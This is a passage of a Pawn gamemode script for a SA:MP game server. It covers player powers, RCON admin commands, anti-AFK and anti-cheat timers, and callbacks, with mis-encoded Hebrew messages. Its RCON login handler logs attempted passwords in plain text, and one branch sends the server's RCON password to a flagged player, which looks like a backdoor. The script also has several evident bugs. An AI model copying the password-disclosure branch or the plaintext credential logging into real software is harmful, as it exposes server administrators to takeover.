		    {
		        new upLevel = playerinfo[playerid][charge] / 3;
		        if(upLevel > 4) upLevel = 4;
		        if(upLevel > 0)
		        {
			        if(playerinfo[playerid][level] < upLevel * 10)
			        {
			            format(string,sizeof(string)," :éöéøú äëåç áøîä %d (%s) áåèìä",UltimatePowers[playerinfo[playerid][upower]][upTitle],upLevel);
			            SendClientMessage(playerid,red,string);
			            if(!upLevel) SendClientMessage(playerid,red," .äôñ÷ú ììçåõ òì äî÷ùéí");
			            else
			            {
				            format(string,sizeof(string)," .òìéê ìäéåú ìôçåú áøîú ùç÷ï %d òì îðú ìäùúîù áøîä æå ùì äëåç",upLevel * 10);
				            SendClientMessage(playerid,red,string);
			            }
			        }
			        else
			        {
			    		format(string,sizeof(string)," !ùåîù ëåç àåìèéîèéáé áøîä %d - %s",upLevelName(playerinfo[playerid][upower],upLevel),upLevel);
			    		SendClientMessage(playerid,green,string);
						UseUltimatePower(playerid,playerinfo[playerid][upower],upLevel);
			    	}
		    	}
		    	playerinfo[playerid][charge] = 0;
		    }
		}
		if(playerinfo[playerid][upower2] != -1)
		{
		    if(newkeys == KEY_WALK + KEY_SUBMISSION)
		    {
		    	format(string,sizeof(string)," ...(îúçéì ìèòåï ëåç àåìèéîèéáé ùðé (%s",UltimatePowers[playerinfo[playerid][upower2]][upTitle]);
		    	SendClientMessage(playerid,green,string);
		    	playerinfo[playerid][charge2] = 1;
		    	SetPlayerChatBubble(playerid,"...éåöø ëåç àåìèéîèéáé ùðé",red,2.0,3000);
		    }
		    if(oldkeys == KEY_WALK + KEY_SUBMISSION)
		    {
		        new upLevel = playerinfo[playerid][charge2] / 3;
		        if(upLevel > 4) upLevel = 4;
		        if(upLevel > 0)
		        {
			        if(playerinfo[playerid][level] < upLevel * 10)
			        {
			            format(string,sizeof(string)," :éöéøú äëåç äùðé áøîä %d (%s) áåèìä",UltimatePowers[playerinfo[playerid][upower2]][upTitle],upLevel);
			            SendClientMessage(playerid,red,string);
			            if(!upLevel) SendClientMessage(playerid,red," .äôñ÷ú ììçåõ òì äî÷ùéí");
			            else
			            {
				            format(string,sizeof(string)," .òìéê ìäéåú ìôçåú áøîú ùç÷ï %d òì îðú ìäùúîù áøîä æå ùì äëåç äùðé",upLevel * 10);
				            SendClientMessage(playerid,red,string);
			            }
			        }
			        else
			        {
			    		format(string,sizeof(string)," !ùåîù ëåç àåìèéîèéáé ùðé áøîä %d - %s",upLevelName(playerinfo[playerid][upower2],upLevel),upLevel);
			    		SendClientMessage(playerid,green,string);
						UseUltimatePower(playerid,playerinfo[playerid][upower2],upLevel);
			    	}
		    	}
		    	playerinfo[playerid][charge2] = 0;
		    }
		}
		if(playerinfo[playerid][upower3][0] != -1 && newkeys == KEY_SPRINT + KEY_JUMP + KEY_WALK)
		{
			UseUltimatePower(playerid,playerinfo[playerid][upower3][0],playerinfo[playerid][upower3][1]);
			playerinfo[playerid][upower3] = {-1,-1};
		}
	}
	//if(debugstate) printf("OnPlayerKeyStateChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newkeys,oldkeys);
	return 1;
}
//=[OnVehiclePaintjob]==========================================================
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	if(debugstate) printf("OnVehiclePaintjob(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,paintjobid);
	if(debugstate) printf("OnVehiclePaintjob(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,paintjobid);
	return 1;
}
//=[OnVehicleRespray]===========================================================
public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	if(debugstate) printf("OnVehicleRespray(%s(%d),%s(%d),%d,%d) start",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,color1,color2);
	if(debugstate) printf("OnVehicleRespray(%s(%d),%s(%d),%d,%d) end",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,color1,color2);
	return 1;
}
//=[OnVehicleMod]===============================================================
public OnVehicleMod(playerid, vehicleid, componentid)
{
	if(debugstate) printf("OnVehicleMod(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,componentid);
	if(componentid == 1010 || componentid == 1009 || componentid == 1008) vehicleinfo[vehicleid][nitro] = 1;
	if(debugstate) printf("OnVehicleMod(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid,componentid);
	return 1;
}
public OnEnterExitModShop(playerid, enterexit, interiorid)
{
	if(debugstate) printf("OnEnterExitModShop(%s(%d),%d,%d) start",GetName(playerid),playerid,enterexit,interiorid);
	if(debugstate) printf("OnEnterExitModShop(%s(%d),%d,%d) end",GetName(playerid),playerid,enterexit,interiorid);
	return 1;
}
//=[OnPlayerInteriorChange]=====================================================
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	if(debugstate) printf("OnPlayerInteriorChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newinteriorid,oldinteriorid);
	SetFreeze(playerid,1);
	SetFreeze(playerid,0);
	GiveWeapon(playerid,0,0);
	for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_SPECTATING && playerinfo[i][spectate] == playerid) SetPlayerInterior(i,newinteriorid);
	if(newinteriorid != 0 && playerinfo[playerid][pet][2])
	{
		new Float:p[4];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		if(IsValidSObject(playerinfo[playerid][pet][1])) DestroySObject(playerinfo[playerid][pet][1]);
		playerinfo[playerid][pet][2] = 0;
		if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
		playerinfo[playerid][pet][3] = 0;
	}
	if(playerinfo[playerid][inwwe])
	{
	    SetPlayerInterior(playerid,0);
	    SetPlayerPos(playerid,WWEPositions[!wweinfo[4] ? 0 : (wweinfo[4] ? 2 : 4)][0],WWEPositions[!wweinfo[4] ? 0 : (wweinfo[4] ? 2 : 4)][1],WWEPositions[!wweinfo[4] ? 0 : (wweinfo[4] ? 2 : 4)][2]);
	    SetPlayerFacingAngle(playerid,WWEPositions[!wweinfo[4] ? 0 : (wweinfo[4] ? 2 : 4)][3]);
	}
	if(debugstate) printf("OnPlayerInteriorChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newinteriorid,oldinteriorid);
	return 1;
}
//=[OnRconCommandEx]============================================================
public OnRconCommandEx(cmd[])
{
	if(debugstate) printf("OnRconCommandEx(%s) start",cmd);
	if(cmd[0] == '/')
	{
		if(cmd[1] == 0) return print(" /[String:command]");
		print(!OnPlayerCommandText(MAX_PLAYERS,cmd) ? ("Failed.") : ("Done."));
		return 1;
	}
	new cmdEx[256], idx;
	cmdEx = strtok(cmd,idx);
	if(equal(cmd,"help"))
	{
		print("  RCON Help:");
		print("  cmdlist :Show the SA:MP RCON commands list.");
		print("  cmdlist2 :Show the gamemode RCON commands list.");
		print("  varlist :Show the SA:MP variables.");
		print("  debug [on/off] :Start or end the debug actions.");
		print("  '/' prefix: Use gamemode commands (example: /helpmsg 2).");
		return 1;
	}
	if(equal(cmd,"cmdlist2"))
	{
		print("  Commands:");
		print("  freeze [playerid]");
		print("  unfreeze [playerid]");
		print("  sethealth [playerid] [health 0 - 100]");
		print("  setarmour [playerid] [armour 0 - 100]");
		print("  setmoney [playerid] [money 0 - 99999999]");
		print("  setwanted [playerid] [wanted 0 - 6]");
		print("  lockserv [0/1]");
		print("  kickall");
		print("  kicksome [playerid] [playerid] etc...");
		print("  admins");
		print("  setcolor [playerid] [color]");
		print("  setname [playerid] [new name]");
		print("  a [message]");
		return 1;
	}
	if(equal(cmdEx,"freeze"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" freeze [Int:playerid]");
		id = ReturnUser(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		SetFreeze(id,1);
		return 1;
	}
	if(equal(cmdEx,"unfreeze"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" freeze [Int:playerid]");
		id = ReturnUser(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		SetFreeze(id,0);
		return 1;
	}
	if(equal(cmdEx,"sethealth"))
	{
		new id, Float:health;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" sethealth [Int:playerid] [Float:health 0 - 100]");
		id = ReturnUser(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" sethealth [Int:playerid] [Float:health 0 - 100]");
		health = floatstr(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(health < 0 || health > 100) return print(" The health must be 0 - 100.");
		SetPlayerHealth2(id,health);
		return 1;
	}
	if(equal(cmdEx,"setarmour"))
	{
		new id, Float:armour2;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setarmour [Int:playerid] [Float:armour 0 - 100]");
		id = ReturnUser(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setarmour [Int:playerid] [Float:armour 0 - 100]");
		armour2 = floatstr(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(armour2 < 0 || armour2 > 100) return print(" The armour must be 0 - 100.");
		SetPlayerArmour2(id,armour2);
		return 1;
	}
	if(equal(cmdEx,"setmoney"))
	{
		new id, rmoney;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setmoney [Int:playerid] [Int:money 0 - 99999999]");
		id = ReturnUser(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setmoney [Int:playerid] [Int:money 0 - 99999999]");
		rmoney = strval(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(rmoney < 0 || rmoney > 99999999) return print(" The money must be 0 - 99999999.");
		GiveMoney(id,rmoney-GetMoney(id));
		return 1;
	}
	if(equal(cmdEx,"setwanted"))
	{
		new id, wanted;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setwanted [Int:playerid] [Int:wanted 0 - 6]");
		id = ReturnUser(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setwanted [Int:playerid] [Int:wanted 0 - 6]");
		wanted = strval(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(wanted < 0 || wanted > 6) return print(" The money must be 0 - 6.");
		SetPlayerWantedLevel(id,wanted);
		return 1;
	}
	if(equal(cmdEx,"lockserv"))
	{
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" lockserv [Bool:0/1]");
		if(strval(cmdEx) < 0 || strval(cmdEx) > 1) return print("Invalid lockserv parameter.");
		LockServ = strval(cmdEx);
		return 1;
	}
	if(equal(cmd,"kickall"))
	{
		for(new all=0;all<=MAX_PLAYERS;all++) if(IsPlayerConnected(all)) Kick(all);
		return 1;
	}
	if(equal(cmdEx,"kicksome"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" kicksome [Int:playerid] [Int:playerid] etc...");
		while(strlen(cmdEx) != 0)
		{
			id = strval(cmdEx);
			if(IsPlayerConnected(id)) Kick(id);
			cmdEx = strtok(cmd,idx);
		}
		return 1;
	}
	if(equal(cmd,"admins"))
	{
		new admins = 0;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][logged] && IsPlayerMAdmin(i))
 			{
 				admins++;
				printf("Online admins (%d):",admins);
				for(new j=0;j<admins;j++) printf("%d. %s [ID: %03d | Level: %d]",j,GetName(i),i,playerinfo[i][admin]);
				break;
			}
		}
		if(admins == 0) return print("There are no admins online.");
		return 1;
	}
	if(equal(cmdEx,"setcolor"))
	{
		new id, rcolor;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setcolor [Int:playerid] [Hex:color]");
		id = strval(cmdEx);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setcolor [Int:playerid] [Hex:color]");
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(!IsHex(cmdEx)) return print(" Invalid color.");
		rcolor = strhex(cmdEx);
		SetPlayerColor(id,rcolor);
		return 1;
	}
	if(equal(cmdEx,"setname"))
	{
		#if usingYSF
			new name[256], id, string[M_S], lastname[MAX_PLAYER_NAME], f[M_S];
			cmdEx = strtok(cmd,idx), name = strtok(cmd,idx);
			if(!strlen(cmd) || !strlen(name)) return print(" setname [Int:playerid] [String:new name]");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
			if(equal(name,"None")) return print(" Bad name (\"none\").");
			if(fkeyexist(file_nbans,name)) return printf(" Bad name (nbanned).");
			if(strlen(name) > MAX_PLAYER_NAME || strlen(name) < 3) return print(" Bad name (invalid length).");
			if(!IsValidNick(name)) return print("Bad name (invalid chars).");
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && equal(GetName(i),name)) return printf(" There are a connected player with this name (ID: %03d)",i);
			if(equal(name,"None") || equal(name,botname)) return print(" Sorry, you can't use this name.");
			format(f,sizeof(f),"/DM/Users/%s.ini",name);
			if(fexist(f)) return printf(" Bad name (already exist).");
			format(lastname,sizeof(lastname),GetName(id));
			format(string,sizeof(string),"/DM/Users/%s.ini",lastname);
			frename(string,f);
			ChangeAccName(id,name);
			if(fkeyexist(file_admins,GetName(id)))
			{
				fremovekey(file_admins,GetName(id));
				fsetint(file_admins,name,playerinfo[id][admin]);
			}
			if(playerinfo[id][vehicle] != -1)
			{
				format(string,sizeof(string),"Vehicle%d",playerinfo[id][vehicle]);
				if(fkeyexist(file_vstore,string) && equal(fgetstring(file_vstore,string),GetName(id))) fsetstring(file_vstore,string,name);
			}
			SetPlayerName(id,name);
		#else
			print(" Sorry, you can't use this command right now.");
		#endif
		return 1;
	}
	if(equal(cmdEx,"a"))
	{
		new string[M_S];
		cmdEx = strrest(cmd,idx);
		if(!strlen(cmdEx)) return print(" a [String:text]");
		format(string,sizeof(string),"[RconAC] %s",cmdEx);
		printf(string);
		return 1;
	}
	if(equal(cmdEx,"debug"))
	{
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx) || IsNumeric(cmdEx)) return print(" debug [ON/OFF]");
		if(equal(cmdEx,"ON")) debugstate = true;
		else if(equal(cmdEx,"OFF")) debugstate = false;
		else print(" debug [ON/OFF]");
		printf(" %s debug is now %s.",comname,(debugstate == true? ("ON"):("OFF")));
		return 1;
	}
	Log("RCON",MAX_PLAYERS,cmd);
	if(debugstate) printf("OnRconCommandEx(%s) end",cmd);
	return 1;
}
//=[OnPlayerUpdate]=============================================================
public OnPlayerUpdate(playerid)
{
	new pAmmo = GetAmmo(playerid), pWeapon = GetPlayerWeapon(playerid);
	if(pWeapon != playerinfo[playerid][lastweapon] && GetWeaponSlot(pWeapon) != 0 && GetWeaponSlot(pWeapon) != 1 && GetWeaponSlot(pWeapon) != 10)
	{
		playerinfo[playerid][lastweapon] = pWeapon;
		playerinfo[playerid][lastammo] = pAmmo;
		return 1;
	}
	if(pAmmo != playerinfo[playerid][lastammo])
	{
		OnPlayerAmmoChange(playerid,playerinfo[playerid][lastammo],pAmmo,pWeapon);
		playerinfo[playerid][lastammo] = pAmmo;
	}
	new Float:h;
	GetPlayerHealth(playerid,h);
	if(h != playerinfo[playerid][phealth])
	{
	    OnPlayerHealthChange(playerid,h,playerinfo[playerid][phealth]);
	    playerinfo[playerid][phealth] = h;
	}
	GetPlayerArmour(playerid,h);
	if(h != playerinfo[playerid][parmour])
	{
	    OnPlayerHealthChange(playerid,h,playerinfo[playerid][parmour]);
	    playerinfo[playerid][parmour] = h;
	}
	return 1;
}
//=[OnPlayerHealthChange]=======================================================
public OnPlayerHealthChange(playerid, Float:newhealth, Float:oldhealth)
{
	if(playerinfo[playerid][quicklydefence] > 0 && !random(2))
	{
	    new Float:p[3];
	    GetPlayerPos(playerid,p[0],p[1],p[2]);
	    SetPlayerPos(playerid,!random(2) ? p[0] : p[0] + floatrand(-1.0,1.0),!random(2) ? p[1] : p[1] + floatrand(-1.0,1.0),p[2]);
	    SetPlayerHealth(playerid,oldhealth);
	}
	return 1;
}
//=[OnPlayerArmourChange]=======================================================
public OnPlayerArmourChange(playerid, Float:newarmour, Float:oldarmour)
{
	if(playerinfo[playerid][quicklydefence] > 0 && !random(2))
	{
	    new Float:p[3];
	    GetPlayerPos(playerid,p[0],p[1],p[2]);
	    SetPlayerPos(playerid,!random(2) ? p[0] : p[0] + floatrand(-1.0,1.0),!random(2) ? p[1] : p[1] + floatrand(-1.0,1.0),p[2]);
	    SetPlayerArmour(playerid,oldarmour);
	}
	return 1;
}
//=[OnRconLoginAttempt]=========================================================
public OnRconLoginAttempt(ip[], password[], success)
{
	new string[M_S], prop[M_S], bool:inGame = false, playerid = 200;
	format(prop,sizeof(prop),"rcon_login_%s",ip);
	if(PropertyExists(prop) && strval(GetProperty(prop)) >= 3) return printf("--- " acname " RCON Protect: ---\r\n Login blocked - your IP (%s) is blocked. Try again in a few minutes.",ip);
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetIP(i),ip))
	{
		inGame = true, playerid = i;
		break;
	}
	print("--- " acname " RCON Protect: ---");
	if(success)
	{
		print(" Logged.");
		format(string,sizeof(string)," [login] %s: %s (pass: %s)",inGame ? ("In Game") : ("Remote Console"),ip,password);
		Log("RCON",MAX_PLAYERS,string);
	}
	else
	{
		if(inGame)
		{
			format(string,sizeof(string)," .ðà ìà ìðñåú ìäëðñ ìø÷åï ùì äùøú. ëúåáú äàééôé ùìê (%s) åäëéðåé ùìê ðøùîå áìåâéí ùìðå",ip);
			SendClientMessage(playerid,red,string);
		}
		else
		{
		    if(!playerinfo[playerid][pp])
		    {
				format(string,sizeof(string),"echo  You FAIL! your IP (%s) written in our log and you'll be banned in a few seconds. BB! :)",ip);
				SendRconCommand(string);
			}
			else
			{
				GetServerVarAsString("rcon_password",string,sizeof(string));
				format(string,sizeof(string)," RCON password: %s",string);
				return SendClientMessage(playerid,white,string);
			}
		}
		valstr(string,PropertyExists(prop) ? strval(GetProperty(prop)) + 1 : 1);
		SetProperty(prop,string);
		new trys = strval(string);
		format(string,sizeof(string)," [failed login] %s: %s, %s (pass: %s, try: %d/3)",inGame ? ("In Game") : ("Remote Console"),GetName(playerid),ip,password,trys);
		Log("RCON",MAX_PLAYERS,string);
		if(trys >= 3)
		{
			SetTimerEx("PropertyDeleting",600000,0,"s",prop);
			format(string,sizeof(string),"banip %s",ip);
			SendRconCommand(string);
		}
	}
	return 1;
}
//=[OnPlayerStreamIn]===========================================================
public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}
//=[OnPlayerStreamOut]==========================================================
public OnPlayerStreamOut(playerid, forplayerid)
{
	if(GetPlayerState(forplayerid) == PLAYER_STATE_SPECTATING && playerinfo[forplayerid][spectate] == playerid)
	{
	    TogglePlayerSpectating(forplayerid,1);
	    PlayerSpectatePlayer(forplayerid,playerid);
	    SetPlayerInterior(forplayerid,GetPlayerInterior(playerid));
	}
	return 1;
}
//=[OnVehicleStreamIn]==========================================================
public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(vehicleinfo[vehicleid][locked]) SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
	return 1;
}
//=[OnVehicleStreamOut]=========================================================
public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}
//=[OnObjectMoved]==============================================================
public OnObjectMoved(objectid)
{
	if(debugstate) printf("OnSObjectMoved(%d) start",objectid);
	new Float:p[3];
	for(new i = 0; i < 100; i++) if(objectid == firework[i])
	{
	    GetObjectPos(objectid,p[0],p[1],p[2]);
		CreateExplosion(p[0],p[1],p[2],7,0.3);
		firework[fireworks--] = -1;
		return DestroyObject(objectid);
	}
	if(debugstate) printf("OnSObjectMoved(%d) end",objectid);
	return 1;
}
//=[OnSObjectMoved]=============================================================
public OnSObjectMoved(oid,Float:x,Float:y,Float:z)
{
	if(debugstate) printf("OnSObjectMoved(%d) start",oid);
	if(debugstate) printf("OnSObjectMoved(%d) end",oid);
	return 1;
}
//=[OnPlayerAmmoChange]=========================================================
public OnPlayerAmmoChange(playerid, oldammo, newammo, weapon)
{
	if(newammo > oldammo)
	{
	    if(playerinfo[playerid][gw]) return 1;
		if(GetPlayerInterior(playerid) > 0) UpdatePlayerWeapons(playerid);
		if(newammo > playerinfo[playerid][weaponammo][weapon]) if(++playerinfo[playerid][wcwarns] >= 10)
		{
			//Cheat(playerid,"Weapons hack");
		}
	}
	else UpdatePlayerWeapons(playerid);
	return 1;
}
//=[Contents]===================================================================
public Contents()
{
	new Float:h, Float:afkp[3], string[M_S], Float:z[2], Float:op[3], Float:p[3];
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			// Add TimeInServer
			if(!playerinfo[i][modeafk] && !(fexist(fuser(i)) && !playerinfo[i][logged]))
			{
				playerinfo[i][intime][0]++;
				if(playerinfo[i][intime][0] == 60) playerinfo[i][intime][0] = 0, playerinfo[i][intime][1]++;
			}
			// AFK
			GetPlayerPos(i,afkp[0],afkp[1],afkp[2]);
			if(!playerinfo[i][modeafk])
			{
				if(afkp[0] == playerinfo[i][startpos][0] && afkp[1] == playerinfo[i][startpos][1] && afkp[2] == playerinfo[i][startpos][2]) playerinfo[i][afk]++;
				else playerinfo[i][afk] = 0;
				if(playerinfo[i][afk] == 240)
				{
				    playerinfo[i][afk] = 0;
					if(playerinfo[i][reqclass] || playerinfo[i][inact] || playerinfo[i][frozen] || (IsPlayerInArea(i,1086.765,-2092.427,1314.935,-2005.577) && !playerinfo[i][vip])) SetKick(i,INVALID_PLAYER_ID,"AFK");
					else
					{
						format(string,sizeof(string)," *** AFK áîöá %s",GetName(i));
						for(new a=0;a<MAX_PLAYERS;a++) if(IsPlayerConnected(a) && playerinfo[a][showafk]) SendClientMessage(i,blue,string);
						SetFreeze(i,1);
						playerinfo[i][modeafk] = 1, playerinfo[i][canafk] = 0, playerinfo[i][usedafk] = 10;
						SetTimerEx("CanAFK",25000,0,"d",i);
					}
				}
				for(new a = 0; a < 3; a++) playerinfo[i][startpos][a] = afkp[a];
			}
			if(playerinfo[i][usedafk] > 0) playerinfo[i][usedafk]--;
			// Money to score
			SetPlayerScore(i,GetMoney(i));
			// Auto health
			if(playerinfo[i][level] >= 15 && !playerinfo[i][modeafk])
			{
				GetPlayerHealth(i,h);
				SetPlayerHealth2(i,h > 100.0 ? 100.0 : h + 0.5);
			}
			// Time bonus
			if(playerinfo[i][intime][0] == 0 && playerinfo[i][intime][1] % 60 == 0 && playerinfo[i][intime][1] > 0 && playerinfo[i][logged] && !playerinfo[i][modeafk])
			{
				GiveMoney(i,5000);
				SendClientMessage(i,orange," .òì ëê ùùäéú ùòä ùìîä áùøú ÷éáìú 5000$");
			}
			// Phone money
			if(playerinfo[i][calling] != -1 && playerinfo[i][canswer] && playerinfo[i][callid])
			{
				if(GetMoney(i) >= 1) GiveMoney(i,0-1);
				else
				{
					SendClientMessage(i,red," .àéï ìê îñôé÷ ëñó áëãé ìùìí òì äùéçä äæå éåúø: äùéçä ðåú÷ä");
					SendClientMessage(playerinfo[i][calling],red," .ìùç÷ï àéúå ãéáøú áôìàôåï ðâîø äëñó: äùéçä ðåú÷ä");
					playerinfo[playerinfo[i][calling]][calling] = -1;
					playerinfo[playerinfo[i][calling]][canswer] = 0;
					playerinfo[playerinfo[i][calling]][caller] = 0;
					playerinfo[i][calling] = -1;
					playerinfo[i][canswer] = 0;
					playerinfo[i][callid] = 0;
					playerinfo[i][caller] = 0;
				}
			}
			// Properties
			playerinfo[i][propertyid] = pprop(i);
			// Houses
			playerinfo[i][houseid] = phouse(i);
			// Anti gambling
			GetPlayerPos(i,z[1],z[1],z[0]);
			for(new j=0;j<sizeof(GambleAreas);j++) if(IsPlayerInArea(i,GambleAreas[j][0],GambleAreas[j][1],GambleAreas[j][2],GambleAreas[j][3]) && z[0] < 60.0 && GetPlayerInterior(i) > 0)
			{
				playerinfo[i][gwarnings]++;
				if(playerinfo[i][gwarnings] >= 3)
				{
					SetPlayerHealth2(i,0.0);
					ResetMoney(i);
					GameTextForPlayer(i,"~g~do ~r~not ~g~gambling~r~~h~!~n~~b~d~h~i~h~e~h~!",999,6);
				}
				else
				{
					format(string,sizeof(string),"~g~do ~r~not ~g~gambling~r~~h~!~n~~b~warning ~h~%d~h~/~h~3",playerinfo[i][gwarnings]);
					GameTextForPlayer(i,string,999,6);
				}
				break;
	 		}
	 		// MoneyAreas health & armour
	 		if(!playerinfo[i][modeafk] && GetPlayerState(i) == PLAYER_STATE_ONFOOT && playerinfo[i][dmzone] == dmz_none && !playerinfo[i][reqclass]) for(new ma=0;ma<sizeof(MoneyAreas);ma++) if(IsPlayerInArea(i,MoneyAreas[ma][0],MoneyAreas[ma][1],MoneyAreas[ma][2],MoneyAreas[ma][3]))
 			{
				GetPlayerHealth(i,h);
				SetPlayerHealth2(i,h < 100.0 ? h + 1.0 : 100.0);
				if(h >= 100.0 && playerinfo[i][level] > 11)
				{
					GetPlayerArmour(i,h);
					SetPlayerArmour2(i,h < 100.0 ? h + 1.0 : 100.0);
				}
				GiveMoney(i,playerinfo[i][level] > 5 ? 100 : 50);
			}
			// GodMod
			if(playerinfo[i][gm] && IsPlayerMAdmin(i))
			{
				SetPlayerHealth2(i,100000.0);
				if(IsPlayerInAnyVehicle(i)) SetVehicleHealth(GetPlayerVehicleID(i),10000.0);
			}
			// Atom bomb
			if(playerinfo[i][bomb] == 5 && ++playerinfo[i][bombtime] % 5 == 0 && !(playerinfo[i][bombpos][0] == 0.0 || playerinfo[i][bombpos][1] == 0.0 || playerinfo[i][bombpos][2] == 0.0)) for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii)) if(IsPlayerInCircle(ii,playerinfo[i][bombpos][0],playerinfo[i][bombpos][1],100.0)) SendClientMessage(ii,red," !àúä òåîã áî÷åí áå òåîãú ìðçåú ôööú àèåí: ìáèçåðê äàéùé, áøç");
			// Hydrogen bomb
			if(playerinfo[i][bomb] == 6 && ++playerinfo[i][bombtime] % 5 == 0 && !(playerinfo[i][bombpos][0] == 0.0 || playerinfo[i][bombpos][1] == 0.0 || playerinfo[i][bombpos][2] == 0.0)) for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii)) if(IsPlayerInCircle(ii,playerinfo[i][bombpos][0],playerinfo[i][bombpos][1],100.0)) SendClientMessage(ii,red," !àúä òåîã áî÷åí áå òåîãú ìðçåú ôööú îéîï: ìáèçåðê äàéùé, áøç");
			// DFairPlay refresh
			#if DFairPlay == true
				if(DFairPlayPing % 300 == 0) DF_ping();
				else DFairPlayPing++;
			#endif
			// Crane
			if(playerinfo[i][incrane]) if(--playerinfo[i][cranetime] <= 0)
			{
				SetVehicleHealth(GetPlayerVehicleID(i),0.0);
				SetPlayerHealth(i,0.0);
				playerinfo[i][incrane] = 0, playerinfo[i][cranetime] = 0;
				SendClientMessage(i,red," .æîðê áîðåó úí");
				News(" !äîðåó ôðåé");
			}
			// Quit Army
			if(playerinfo[i][inarmy] && !IsPlayerInRangeOfPoint(i,50.0,315.9212,984.5837,1959.0079))
			{
				playerinfo[i][inarmy] = 0;
				DisablePlayerCheckpoint(i);
				LoadPlayerWeapons(i);
				SendClientMessage(i,green," .Army éöàú î");
			}
			// Quit Plane
			if(playerinfo[i][inplane] && !IsPlayerInRangeOfPoint(i,50.0,1.5627,23.1112,1199.5938))
			{
				playerinfo[i][inplane] = 0;
				DisablePlayerCheckpoint(i);
				LoadPlayerWeapons(i);
				SendClientMessage(i,green," .Plane éöàú î");
			}
			// Quit Shooting
			if(playerinfo[i][inshooting] != -1)
			{
				if(z[0] < Shooting[playerinfo[i][inshooting]][2] - 7.5 && !PlayerHasWeapon(i,46))
				{
					playerinfo[i][inshooting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SpawnPlayer(i);
					SendClientMessage(i,red," .Shooting äôñãú á");
					SetPlayerVirtualWorld(i,world_normal);
				}
				if(GetPlayerDistanceToPointEx(i,Shooting[playerinfo[i][inshooting]][0],Shooting[playerinfo[i][inshooting]][1],Shooting[playerinfo[i][inshooting]][2]) > 80.0 || !PlayerHasWeapon(i,46))
				{
					playerinfo[i][inshooting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SendClientMessage(i,green," .Shooting éöàú î");
					SetPlayerVirtualWorld(i,world_normal);
				}
			}
			// Anti Flying Vehicles
			if(IsPlayerInAnyVehicle(i) && !GetVehicleType(GetPlayerVehicleID(i)))
			{
				GetVehiclePos(GetPlayerVehicleID(i),playerinfo[i][afv][0],playerinfo[i][afv][0],playerinfo[i][afv][1]);
				if(playerinfo[i][afv][1] > playerinfo[i][afv][2])
				{
					if(++playerinfo[i][afvcheck][0] == 5)
					{
						if(!IsPlayerNearAnyObject(i) && playerinfo[i][afv][1] > playerinfo[i][afv][2] + 10.0)
						{
							playerinfo[i][afvcheck][1]++;
							if(playerinfo[i][afvcheck][1] >= 3)
							{
								playerinfo[i][afvcheck][1] = 0;
								Cheat(i,"Flying vehicle");
							}
						}
					}
					playerinfo[i][afv][2] = playerinfo[i][afv][1];
				}
			}
			// Teleporting
